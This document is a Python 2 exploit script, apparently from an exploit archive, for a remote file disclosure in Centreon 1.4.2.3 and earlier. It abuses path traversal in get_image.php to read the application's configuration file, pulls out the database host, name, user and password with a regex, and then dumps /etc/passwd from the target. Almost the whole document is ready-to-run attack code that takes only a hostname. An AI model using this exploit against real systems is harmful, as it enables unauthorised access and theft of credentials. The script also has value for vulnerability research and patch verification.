Centreon <= 1.4.2.3 (get_image.php) Remote File Disclosure Exploit
==================================================================




#!/usr/bin/python

# Date : 20/01/2008
# Author : Julien CAYSSOL 

import sys, urllib2,re


user_agent =  &#039;Mozilla/6.0 (compatible; MSIE 6.0; Windows NT)&#039;
headers =  { &#039;User-Agent&#039;  : user_agent ,
                                &#039;Accept-Charset&#039; : &#039;ISO-8859-15&#039; }


if __name__ == "__main__":

    if len(sys.argv)==2:
        host = sys.argv[1]
        print " [+] Host : " + host

        url = "http://"+sys.argv[1]+"/include/doc/get_image.php?lang=&img=../../www/oreon.conf.php"
        req = urllib2.Request(url, None, headers)
        html = urllib2.urlopen(req).read()
        html = re.sub(&#039;\n&#039;,&#039;&#039;,html)
        ident =re.findall(&#039;\$conf_oreon\[\&#039;host\&#039;\] = "(.*?)";\$conf_oreon\[\&#039;user\&#039;\] = "(.*?)";\$conf_oreon\[\&#039;password\&#039;\] = "(.*?)";\$conf_oreon\[\&#039;db\&#039;\] = "(.*?)";&#039;,html)
        print " [*] Result :  "
        print " + DB Host : "+ident[0][0]
        print " + DB Name : "+ident[0][3]
        print " + DB user : "+ident[0][1]
        print " + DB pass : "+ident[0][2]

        print " [*] /etc/passwd for Fun"
        url = "http://"+sys.argv[1]+"/include/doc/get_image.php?lang=&img=../../../../../etc/passwd"
        req = urllib2.Request(url, None, headers)
        html = urllib2.urlopen(req).read()
        print html

    else:
        print "./Poc.py HOST"





